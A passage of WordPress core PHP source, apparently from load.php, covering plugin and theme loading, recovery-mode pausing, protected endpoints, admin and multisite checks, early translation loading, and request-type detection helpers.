		array_unshift( $plugins, ABSPATH . 'my-hacks.php' );
	}

	if ( empty( $active_plugins ) || wp_installing() ) {
		return $plugins;
	}

	$network_plugins = is_multisite() ? wp_get_active_network_plugins() : false;

	foreach ( $active_plugins as $plugin ) {
		if ( ! validate_file( $plugin )                     // $plugin must validate as file.
			&& str_ends_with( $plugin, '.php' )             // $plugin must end with '.php'.
			&& file_exists( WP_PLUGIN_DIR . '/' . $plugin ) // $plugin must exist.
			// Not already included as a network plugin.
			&& ( ! $network_plugins || ! in_array( WP_PLUGIN_DIR . '/' . $plugin, $network_plugins, true ) )
		) {
			$plugins[] = WP_PLUGIN_DIR . '/' . $plugin;
		}
	}

	/*
	 * Remove plugins from the list of active plugins when we're on an endpoint
	 * that should be protected against WSODs and the plugin is paused.
	 */
	if ( wp_is_recovery_mode() ) {
		$plugins = wp_skip_paused_plugins( $plugins );
	}

	return $plugins;
}

/**
 * Filters a given list of plugins, removing any paused plugins from it.
 *
 * @since 5.2.0
 *
 * @global WP_Paused_Extensions_Storage $_paused_plugins
 *
 * @param string[] $plugins Array of absolute plugin main file paths.
 * @return string[] Filtered array of plugins, without any paused plugins.
 */
function wp_skip_paused_plugins( array $plugins ) {
	$paused_plugins = wp_paused_plugins()->get_all();

	if ( empty( $paused_plugins ) ) {
		return $plugins;
	}

	foreach ( $plugins as $index => $plugin ) {
		list( $plugin ) = explode( '/', plugin_basename( $plugin ) );

		if ( array_key_exists( $plugin, $paused_plugins ) ) {
			unset( $plugins[ $index ] );

			// Store list of paused plugins for displaying an admin notice.
			$GLOBALS['_paused_plugins'][ $plugin ] = $paused_plugins[ $plugin ];
		}
	}

	return $plugins;
}

/**
 * Retrieves an array of active and valid themes.
 *
 * While upgrading or installing WordPress, no themes are returned.
 *
 * @since 5.1.0
 * @access private
 *
 * @global string $pagenow            The filename of the current screen.
 * @global string $wp_stylesheet_path Path to current theme's stylesheet directory.
 * @global string $wp_template_path   Path to current theme's template directory.
 *
 * @return string[] Array of absolute paths to theme directories.
 */
function wp_get_active_and_valid_themes() {
	global $pagenow, $wp_stylesheet_path, $wp_template_path;

	$themes = array();

	if ( wp_installing() && 'wp-activate.php' !== $pagenow ) {
		return $themes;
	}

	if ( is_child_theme() ) {
		$themes[] = $wp_stylesheet_path;
	}

	$themes[] = $wp_template_path;

	/*
	 * Remove themes from the list of active themes when we're on an endpoint
	 * that should be protected against WSODs and the theme is paused.
	 */
	if ( wp_is_recovery_mode() ) {
		$themes = wp_skip_paused_themes( $themes );

		// If no active and valid themes exist, skip loading themes.
		if ( empty( $themes ) ) {
			add_filter( 'wp_using_themes', '__return_false' );
		}
	}

	return $themes;
}

/**
 * Filters a given list of themes, removing any paused themes from it.
 *
 * @since 5.2.0
 *
 * @global WP_Paused_Extensions_Storage $_paused_themes
 *
 * @param string[] $themes Array of absolute theme directory paths.
 * @return string[] Filtered array of absolute paths to themes, without any paused themes.
 */
function wp_skip_paused_themes( array $themes ) {
	$paused_themes = wp_paused_themes()->get_all();

	if ( empty( $paused_themes ) ) {
		return $themes;
	}

	foreach ( $themes as $index => $theme ) {
		$theme = basename( $theme );

		if ( array_key_exists( $theme, $paused_themes ) ) {
			unset( $themes[ $index ] );

			// Store list of paused themes for displaying an admin notice.
			$GLOBALS['_paused_themes'][ $theme ] = $paused_themes[ $theme ];
		}
	}

	return $themes;
}

/**
 * Determines whether WordPress is in Recovery Mode.
 *
 * In this mode, plugins or themes that cause WSODs will be paused.
 *
 * @since 5.2.0
 *
 * @return bool
 */
function wp_is_recovery_mode() {
	return wp_recovery_mode()->is_active();
}

/**
 * Determines whether we are currently on an endpoint that should be protected against WSODs.
 *
 * @since 5.2.0
 *
 * @global string $pagenow The filename of the current screen.
 *
 * @return bool True if the current endpoint should be protected.
 */
function is_protected_endpoint() {
	// Protect login pages.
	if ( isset( $GLOBALS['pagenow'] ) && 'wp-login.php' === $GLOBALS['pagenow'] ) {
		return true;
	}

	// Protect the admin backend.
	if ( is_admin() && ! wp_doing_ajax() ) {
		return true;
	}

	// Protect Ajax actions that could help resolve a fatal error should be available.
	if ( is_protected_ajax_action() ) {
		return true;
	}

	/**
	 * Filters whether the current request is against a protected endpoint.
	 *
	 * This filter is only fired when an endpoint is requested which is not already protected by
	 * WordPress core. As such, it exclusively allows providing further protected endpoints in
	 * addition to the admin backend, login pages and protected Ajax actions.
	 *
	 * @since 5.2.0
	 *
	 * @param bool $is_protected_endpoint Whether the currently requested endpoint is protected.
	 *                                    Default false.
	 */
	return (bool) apply_filters( 'is_protected_endpoint', false );
}

/**
 * Determines whether we are currently handling an Ajax action that should be protected against WSODs.
 *
 * @since 5.2.0
 *
 * @return bool True if the current Ajax action should be protected.
 */
function is_protected_ajax_action() {
	if ( ! wp_doing_ajax() ) {
		return false;
	}

	if ( ! isset( $_REQUEST['action'] ) ) {
		return false;
	}

	$actions_to_protect = array(
		'edit-theme-plugin-file', // Saving changes in the core code editor.
		'heartbeat',              // Keep the heart beating.
		'install-plugin',         // Installing a new plugin.
		'install-theme',          // Installing a new theme.
		'search-plugins',         // Searching in the list of plugins.
		'search-install-plugins', // Searching for a plugin in the plugin install screen.
		'update-plugin',          // Update an existing plugin.
		'update-theme',           // Update an existing theme.
		'activate-plugin',        // Activating an existing plugin.
	);

	/**
	 * Filters the array of protected Ajax actions.
	 *
	 * This filter is only fired when doing Ajax and the Ajax request has an 'action' property.
	 *
	 * @since 5.2.0
	 *
	 * @param string[] $actions_to_protect Array of strings with Ajax actions to protect.
	 */
	$actions_to_protect = (array) apply_filters( 'wp_protected_ajax_actions', $actions_to_protect );

	if ( ! in_array( $_REQUEST['action'], $actions_to_protect, true ) ) {
		return false;
	}

	return true;
}

/**
 * Sets internal encoding.
 *
 * In most cases the default internal encoding is latin1, which is
 * of no use, since we want to use the `mb_` functions for `utf-8` strings.
 *
 * @since 3.0.0
 * @access private
 */
function wp_set_internal_encoding() {
	if ( function_exists( 'mb_internal_encoding' ) ) {
		$charset = get_option( 'blog_charset' );
		// phpcs:ignore WordPress.PHP.NoSilencedErrors.Discouraged
		if ( ! $charset || ! @mb_internal_encoding( $charset ) ) {
			mb_internal_encoding( 'UTF-8' );
		}
	}
}

/**
 * Adds magic quotes to `$_GET`, `$_POST`, `$_COOKIE`, and `$_SERVER`.
 *
 * Also forces `$_REQUEST` to be `$_GET + $_POST`. If `$_SERVER`,
 * `$_COOKIE`, or `$_ENV` are needed, use those superglobals directly.
 *
 * @since 3.0.0
 * @access private
 */
function wp_magic_quotes() {
	// Escape with wpdb.
	$_GET    = add_magic_quotes( $_GET );
	$_POST   = add_magic_quotes( $_POST );
	$_COOKIE = add_magic_quotes( $_COOKIE );
	$_SERVER = add_magic_quotes( $_SERVER );

	// Force REQUEST to be GET + POST.
	$_REQUEST = array_merge( $_GET, $_POST );
}

/**
 * Runs just before PHP shuts down execution.
 *
 * @since 1.2.0
 * @access private
 */
function shutdown_action_hook() {
	/**
	 * Fires just before PHP shuts down execution.
	 *
	 * @since 1.2.0
	 */
	do_action( 'shutdown' );

	wp_cache_close();
}

/**
 * Clones an object.
 *
 * @since 2.7.0
 * @deprecated 3.2.0
 *
 * @param object $input_object The object to clone.
 * @return object The cloned object.
 */
function wp_clone( $input_object ) {
	// Use parens for clone to accommodate PHP 4. See #17880.
	return clone( $input_object );
}

/**
 * Determines whether the current request is for the login screen.
 *
 * @since 6.1.0
 *
 * @see wp_login_url()
 *
 * @return bool True if inside WordPress login screen, false otherwise.
 */
function is_login() {
	return false !== stripos( wp_login_url(), $_SERVER['SCRIPT_NAME'] );
}

/**
 * Determines whether the current request is for an administrative interface page.
 *
 * Does not check if the user is an administrator; use current_user_can()
 * for checking roles and capabilities.
 *
 * For more information on this and similar theme functions, check out
 * the {@link https://developer.wordpress.org/themes/basics/conditional-tags/
 * Conditional Tags} article in the Theme Developer Handbook.
 *
 * @since 1.5.1
 *
 * @global WP_Screen $current_screen WordPress current screen object.
 *
 * @return bool True if inside WordPress administration interface, false otherwise.
 */
function is_admin() {
	if ( isset( $GLOBALS['current_screen'] ) ) {
		return $GLOBALS['current_screen']->in_admin();
	} elseif ( defined( 'WP_ADMIN' ) ) {
		return WP_ADMIN;
	}

	return false;
}

/**
 * Determines whether the current request is for a site's administrative interface.
 *
 * e.g. `/wp-admin/`
 *
 * Does not check if the user is an administrator; use current_user_can()
 * for checking roles and capabilities.
 *
 * @since 3.1.0
 *
 * @global WP_Screen $current_screen WordPress current screen object.
 *
 * @return bool True if inside WordPress site administration pages.
 */
function is_blog_admin() {
	if ( isset( $GLOBALS['current_screen'] ) ) {
		return $GLOBALS['current_screen']->in_admin( 'site' );
	} elseif ( defined( 'WP_BLOG_ADMIN' ) ) {
		return WP_BLOG_ADMIN;
	}

	return false;
}

/**
 * Determines whether the current request is for the network administrative interface.
 *
 * e.g. `/wp-admin/network/`
 *
 * Does not check if the user is an administrator; use current_user_can()
 * for checking roles and capabilities.
 *
 * Does not check if the site is a Multisite network; use is_multisite()
 * for checking if Multisite is enabled.
 *
 * @since 3.1.0
 *
 * @global WP_Screen $current_screen WordPress current screen object.
 *
 * @return bool True if inside WordPress network administration pages.
 */
function is_network_admin() {
	if ( isset( $GLOBALS['current_screen'] ) ) {
		return $GLOBALS['current_screen']->in_admin( 'network' );
	} elseif ( defined( 'WP_NETWORK_ADMIN' ) ) {
		return WP_NETWORK_ADMIN;
	}

	return false;
}

/**
 * Determines whether the current request is for a user admin screen.
 *
 * e.g. `/wp-admin/user/`
 *
 * Does not check if the user is an administrator; use current_user_can()
 * for checking roles and capabilities.
 *
 * @since 3.1.0
 *
 * @global WP_Screen $current_screen WordPress current screen object.
 *
 * @return bool True if inside WordPress user administration pages.
 */
function is_user_admin() {
	if ( isset( $GLOBALS['current_screen'] ) ) {
		return $GLOBALS['current_screen']->in_admin( 'user' );
	} elseif ( defined( 'WP_USER_ADMIN' ) ) {
		return WP_USER_ADMIN;
	}

	return false;
}

/**
 * Determines whether Multisite is enabled.
 *
 * @since 3.0.0
 *
 * @return bool True if Multisite is enabled, false otherwise.
 */
function is_multisite() {
	if ( defined( 'MULTISITE' ) ) {
		return MULTISITE;
	}

	if ( defined( 'SUBDOMAIN_INSTALL' ) || defined( 'VHOST' ) || defined( 'SUNRISE' ) ) {
		return true;
	}

	return false;
}

/**
 * Retrieves the current site ID.
 *
 * @since 3.1.0
 *
 * @global int $blog_id
 *
 * @return int Site ID.
 */
function get_current_blog_id() {
	global $blog_id;

	return absint( $blog_id );
}

/**
 * Retrieves the current network ID.
 *
 * @since 4.6.0
 *
 * @return int The ID of the current network.
 */
function get_current_network_id() {
	if ( ! is_multisite() ) {
		return 1;
	}

	$current_network = get_network();

	if ( ! isset( $current_network->id ) ) {
		return get_main_network_id();
	}

	return absint( $current_network->id );
}

/**
 * Attempts an early load of translations.
 *
 * Used for errors encountered during the initial loading process, before
 * the locale has been properly detected and loaded.
 *
 * Designed for unusual load sequences (like setup-config.php) or for when
 * the script will then terminate with an error, otherwise there is a risk
 * that a file can be double-included.
 *
 * @since 3.4.0
 * @access private
 *
 * @global WP_Textdomain_Registry $wp_textdomain_registry WordPress Textdomain Registry.
 * @global WP_Locale              $wp_locale              WordPress date and time locale object.
 */
function wp_load_translations_early() {
	global $wp_textdomain_registry, $wp_locale;
	static $loaded = false;

	if ( $loaded ) {
		return;
	}

	$loaded = true;

	if ( function_exists( 'did_action' ) && did_action( 'init' ) ) {
		return;
	}

	// We need $wp_local_package.
	require ABSPATH . WPINC . '/version.php';

	// Translation and localization.
	require_once ABSPATH . WPINC . '/pomo/mo.php';
	require_once ABSPATH . WPINC . '/l10n/class-wp-translation-controller.php';
	require_once ABSPATH . WPINC . '/l10n/class-wp-translations.php';
	require_once ABSPATH . WPINC . '/l10n/class-wp-translation-file.php';
	require_once ABSPATH . WPINC . '/l10n/class-wp-translation-file-mo.php';
	require_once ABSPATH . WPINC . '/l10n/class-wp-translation-file-php.php';
	require_once ABSPATH . WPINC . '/l10n.php';
	require_once ABSPATH . WPINC . '/class-wp-textdomain-registry.php';
	require_once ABSPATH . WPINC . '/class-wp-locale.php';
	require_once ABSPATH . WPINC . '/class-wp-locale-switcher.php';

	// General libraries.
	require_once ABSPATH . WPINC . '/plugin.php';

	$locales   = array();
	$locations = array();

	if ( ! $wp_textdomain_registry instanceof WP_Textdomain_Registry ) {
		$wp_textdomain_registry = new WP_Textdomain_Registry();
	}

	while ( true ) {
		if ( defined( 'WPLANG' ) ) {
			if ( '' === WPLANG ) {
				break;
			}
			$locales[] = WPLANG;
		}

		if ( isset( $wp_local_package ) ) {
			$locales[] = $wp_local_package;
		}

		if ( ! $locales ) {
			break;
		}

		if ( defined( 'WP_LANG_DIR' ) && @is_dir( WP_LANG_DIR ) ) {
			$locations[] = WP_LANG_DIR;
		}

		if ( defined( 'WP_CONTENT_DIR' ) && @is_dir( WP_CONTENT_DIR . '/languages' ) ) {
			$locations[] = WP_CONTENT_DIR . '/languages';
		}

		if ( @is_dir( ABSPATH . 'wp-content/languages' ) ) {
			$locations[] = ABSPATH . 'wp-content/languages';
		}

		if ( @is_dir( ABSPATH . WPINC . '/languages' ) ) {
			$locations[] = ABSPATH . WPINC . '/languages';
		}

		if ( ! $locations ) {
			break;
		}

		$locations = array_unique( $locations );

		foreach ( $locales as $locale ) {
			foreach ( $locations as $location ) {
				if ( file_exists( $location . '/' . $locale . '.mo' ) ) {
					load_textdomain( 'default', $location . '/' . $locale . '.mo', $locale );

					if ( defined( 'WP_SETUP_CONFIG' ) && file_exists( $location . '/admin-' . $locale . '.mo' ) ) {
						load_textdomain( 'default', $location . '/admin-' . $locale . '.mo', $locale );
					}

					break 2;
				}
			}
		}

		break;
	}

	$wp_locale = new WP_Locale();
}

/**
 * Checks or sets whether WordPress is in "installation" mode.
 *
 * If the `WP_INSTALLING` constant is defined during the bootstrap, `wp_installing()` will default to `true`.
 *
 * @since 4.4.0
 *
 * @param bool $is_installing Optional. True to set WP into Installing mode, false to turn Installing mode off.
 *                            Omit this parameter if you only want to fetch the current status.
 * @return bool True if WP is installing, otherwise false. When a `$is_installing` is passed, the function will
 *              report whether WP was in installing mode prior to the change to `$is_installing`.
 */
function wp_installing( $is_installing = null ) {
	static $installing = null;

	// Support for the `WP_INSTALLING` constant, defined before WP is loaded.
	if ( is_null( $installing ) ) {
		$installing = defined( 'WP_INSTALLING' ) && WP_INSTALLING;
	}

	if ( ! is_null( $is_installing ) ) {
		$old_installing = $installing;
		$installing     = $is_installing;

		return (bool) $old_installing;
	}

	return (bool) $installing;
}

/**
 * Determines if SSL is used.
 *
 * @since 2.6.0
 * @since 4.6.0 Moved from functions.php to load.php.
 *
 * @return bool True if SSL, otherwise false.
 */
function is_ssl() {
	if ( isset( $_SERVER['HTTPS'] ) ) {
		if ( 'on' === strtolower( $_SERVER['HTTPS'] ) ) {
			return true;
		}

		if ( '1' === (string) $_SERVER['HTTPS'] ) {
			return true;
		}
	} elseif ( isset( $_SERVER['SERVER_PORT'] ) && ( '443' === (string) $_SERVER['SERVER_PORT'] ) ) {
		return true;
	}

	return false;
}

/**
 * Converts a shorthand byte value to an integer byte value.
 *
 * @since 2.3.0
 * @since 4.6.0 Moved from media.php to load.php.
 *
 * @link https://www.php.net/manual/en/function.ini-get.php
 * @link https://www.php.net/manual/en/faq.using.php#faq.using.shorthandbytes
 *
 * @param string $value A (PHP ini) byte value, either shorthand or ordinary.
 * @return int An integer byte value.
 */
function wp_convert_hr_to_bytes( $value ) {
	$value = strtolower( trim( $value ) );
	$bytes = (int) $value;

	if ( str_contains( $value, 'g' ) ) {
		$bytes *= GB_IN_BYTES;
	} elseif ( str_contains( $value, 'm' ) ) {
		$bytes *= MB_IN_BYTES;
	} elseif ( str_contains( $value, 'k' ) ) {
		$bytes *= KB_IN_BYTES;
	}

	// Deal with large (float) values which run into the maximum integer size.
	return min( $bytes, PHP_INT_MAX );
}

/**
 * Determines whether a PHP ini value is changeable at runtime.
 *
 * @since 4.6.0
 *
 * @link https://www.php.net/manual/en/function.ini-get-all.php
 *
 * @param string $setting The name of the ini setting to check.
 * @return bool True if the value is changeable at runtime. False otherwise.
 */
function wp_is_ini_value_changeable( $setting ) {
	static $ini_all;

	if ( ! isset( $ini_all ) ) {
		$ini_all = false;
		// Sometimes `ini_get_all()` is disabled via the `disable_functions` option for "security purposes".
		if ( function_exists( 'ini_get_all' ) ) {
			$ini_all = ini_get_all();
		}
	}

	// Bit operator to workaround https://bugs.php.net/bug.php?id=44936 which changes access level to 63 in PHP 5.2.6 - 5.2.17.
	if ( isset( $ini_all[ $setting ]['access'] )
		&& ( INI_ALL === ( $ini_all[ $setting ]['access'] & 7 ) || INI_USER === ( $ini_all[ $setting ]['access'] & 7 ) )
	) {
		return true;
	}

	// If we were unable to retrieve the details, fail gracefully to assume it's changeable.
	if ( ! is_array( $ini_all ) ) {
		return true;
	}

	return false;
}

/**
 * Determines whether the current request is a WordPress Ajax request.
 *
 * @since 4.7.0
 *
 * @return bool True if it's a WordPress Ajax request, false otherwise.
 */
function wp_doing_ajax() {
	/**
	 * Filters whether the current request is a WordPress Ajax request.
	 *
	 * @since 4.7.0
	 *
	 * @param bool $wp_doing_ajax Whether the current request is a WordPress Ajax request.
	 */
	return apply_filters( 'wp_doing_ajax', defined( 'DOING_AJAX' ) && DOING_AJAX );
}

/**
 * Determines whether the current request should use themes.
 *
 * @since 5.1.0
 *
 * @return bool True if themes should be used, false otherwise.
 */
function wp_using_themes() {
	/**
	 * Filters whether the current request should use themes.
	 *
	 * @since 5.1.0
	 *
	 * @param bool $wp_using_themes Whether the current request should use themes.
	 */
	return apply_filters( 'wp_using_themes', defined( 'WP_USE_THEMES' ) && WP_USE_THEMES );
}

/**
 * Determines whether the current request is a WordPress cron request.
 *
 * @since 4.8.0
 *
 * @return bool True if it's a WordPress cron request, false otherwise.
 */
function wp_doing_cron() {
	/**
	 * Filters whether the current request is a WordPress cron request.
	 *
	 * @since 4.8.0
	 *
	 * @param bool $wp_doing_cron Whether the current request is a WordPress cron request.
	 */
	return apply_filters( 'wp_doing_cron', defined( 'DOING_CRON' ) && DOING_CRON );
}

/**
 * Checks whether the given variable is a WordPress Error.
 *
 * Returns whether `$thing` is an instance of the `WP_Error` class.
 *
 * @since 2.1.0
 *
 * @param mixed $thing The variable to check.
 * @return bool Whether the variable is an instance of WP_Error.
 */
function is_wp_error( $thing ) {
	$is_wp_error = ( $thing instanceof WP_Error );

	if ( $is_wp_error ) {
		/**
		 * Fires when `is_wp_error()` is called and its parameter is an instance of `WP_Error`.
		 *
		 * @since 5.6.0
		 *
		 * @param WP_Error $thing The error object passed to `is_wp_error()`.
		 */
		do_action( 'is_wp_error_instance', $thing );
	}

	return $is_wp_error;
}

/**
 * Determines whether file modifications are allowed.
 *
 * @since 4.8.0
 *
 * @param string $context The usage context.
 * @return bool True if file modification is allowed, false otherwise.
 */
function wp_is_file_mod_allowed( $context ) {
	/**
	 * Filters whether file modifications are allowed.
	 *
	 * @since 4.8.0
	 *
	 * @param bool   $file_mod_allowed Whether file modifications are allowed.
	 * @param string $context          The usage context.
	 */
	return apply_filters( 'file_mod_allowed', ! defined( 'DISALLOW_FILE_MODS' ) || ! DISALLOW_FILE_MODS, $context );
}

/**
 * Starts scraping edited file errors.
 *
 * @since 4.9.0
 */
function wp_start_scraping_edited_file_errors() {
	if ( ! isset( $_REQUEST['wp_scrape_key'] ) || ! isset( $_REQUEST['wp_scrape_nonce'] ) ) {
		return;
	}

	$key   = substr( sanitize_key( wp_unslash( $_REQUEST['wp_scrape_key'] ) ), 0, 32 );
	$nonce = wp_unslash( $_REQUEST['wp_scrape_nonce'] );

	if ( get_transient( 'scrape_key_' . $key ) !== $nonce ) {
		echo "###### wp_scraping_result_start:$key ######";
		echo wp_json_encode(
			array(
				'code'    => 'scrape_nonce_failure',
				'message' => __( 'Scrape key check failed. Please try again.' ),
			)
		);
		echo "###### wp_scraping_result_end:$key ######";
		die();
	}

	if ( ! defined( 'WP_SANDBOX_SCRAPING' ) ) {
		define( 'WP_SANDBOX_SCRAPING', true );
	}

	register_shutdown_function( 'wp_finalize_scraping_edited_file_errors', $key );
}

/**
 * Finalizes scraping for edited file errors.
 *
 * @since 4.9.0
 *
 * @param string $scrape_key Scrape key.
 */
function wp_finalize_scraping_edited_file_errors( $scrape_key ) {
	$error = error_get_last();

	echo "\n###### wp_scraping_result_start:$scrape_key ######\n";

	if ( ! empty( $error )
		&& in_array( $error['type'], array( E_CORE_ERROR, E_COMPILE_ERROR, E_ERROR, E_PARSE, E_USER_ERROR, E_RECOVERABLE_ERROR ), true )
	) {
		$error = str_replace( ABSPATH, '', $error );
		echo wp_json_encode( $error );
	} else {
		echo wp_json_encode( true );
	}

	echo "\n###### wp_scraping_result_end:$scrape_key ######\n";
}

/**
 * Checks whether current request is a JSON request, or is expecting a JSON response.
 *
 * @since 5.0.0
 *
 * @return bool True if `Accepts` or `Content-Type` headers contain `application/json`.
 *              False otherwise.
 */
function wp_is_json_request() {
	if ( isset( $_SERVER['HTTP_ACCEPT'] ) && wp_is_json_media_type( $_SERVER['HTTP_ACCEPT'] ) ) {
		return true;
	}

	if ( isset( $_SERVER['CONTENT_TYPE'] ) && wp_is_json_media_type( $_SERVER['CONTENT_TYPE'] ) ) {
		return true;
	}

	return false;
}

/**
 * Checks whether current request is a JSONP request, or is expecting a JSONP response.
 *
 * @since 5.2.0
 *
 * @return bool True if JSONP request, false otherwise.
 */
function wp_is_jsonp_request() {
	if ( ! isset( $_GET['_jsonp'] ) ) {
		return false;
	}

	if ( ! function_exists( 'wp_check_jsonp_callback' ) ) {
		require_once ABSPATH . WPINC . '/functions.php';
	}

	$jsonp_callback = $_GET['_jsonp'];
	if ( ! wp_check_jsonp_callback( $jsonp_callback ) ) {
		return false;
	}

	/** This filter is documented in wp-includes/rest-api/class-wp-rest-server.php */
	$jsonp_enabled = apply_filters( 'rest_jsonp_enabled', true );

	return $jsonp_enabled;
}

/**
 * Checks whether a string is a valid JSON Media Type.
 *
 * @since 5.6.0
 *
 * @param string $media_type A Media Type string to check.
 * @return bool True if string is a valid JSON Media Type.
 */
function wp_is_json_media_type( $media_type ) {
	static $cache = array();

	if ( ! isset( $cache[ $media_type ] ) ) {
		$cache[ $media_type ] = (bool) preg_match( '/(^|\s|,)application\/([\w!#\$&-\^\.\+]+\+)?json(\+oembed)?($|\s|;|,)/i', $media_type );
	}

	return $cache[ $media_type ];
}

/**
 * Checks whether current request is an XML request, or is expecting an XML response.
 *
 * @since 5.2.0
 *
 * @return bool True if `Accepts` or `Content-Type` headers contain `text/xml`
 *              or one of the related MIME types. False otherwise.
 */
function wp_is_xml_request() {
	$accepted = array(
		'text/xml',
		'application/rss+xml',
		'application/atom+xml',
		'application/rdf+xml',
		'text/xml+oembed',
		'application/xml+oembed',
	);

	if ( isset( $_SERVER['HTTP_ACCEPT'] ) ) {
		foreach ( $accepted as $type ) {
			if ( str_contains( $_SERVER['HTTP_ACCEPT'], $type ) ) {
				return true;
			}
		}
	}

	if ( isset( $_SERVER['CONTENT_TYPE'] ) && in_array( $_SERVER['CONTENT_TYPE'], $accepted, true ) ) {
		return true;
	}

	return false;
}

/**
 * Checks if this site is protected by HTTP Basic Auth.
 *
 * At the moment, this merely checks for the present of Basic Auth credentials. Therefore, calling
 * this function with a context different from the current context may give inaccurate results.
 * In a future release, this evaluation may be made more robust.
 *
 * Currently, this is only used by Application Passwords to prevent a conflict since it also utilizes
 * Basic Auth.
 *
 * @since 5.6.1
 *
 * @global string $pagenow The filename of the current screen.
 *
 * @param string $context The context to check for protection. Accepts 'login', 'admin', and 'front'.
 *                        Defaults to the current context.
 * @return bool Whether the site is protected by Basic Auth.
 */
function wp_is_site_protected_by_basic_auth( $context = '' ) {
	global $pagenow;

	if ( ! $context ) {
		if ( 'wp-login.php' === $pagenow ) {
			$context = 'login';
		} elseif ( is_admin() ) {
			$context = 'admin';
		} else {
			$context = 'front';
		}
	}

	$is_protected = ! empty( $_SERVER['PHP_AUTH_USER'] ) || ! empty( $_SERVER['PHP_AUTH_PW'] );

	/**
	 * Filters whether a site is protected by HTTP Basic Auth.
	 *
	 * @since 5.6.1
	 *
	 * @param bool $is_protected Whether the site is protected by Basic Auth.
	 * @param string $context    The context to check for protection. One of 'login', 'admin', or 'front'.
	 */
	return apply_filters( 'wp_is_site_protected_by_basic_auth', $is_protected, $context );
}
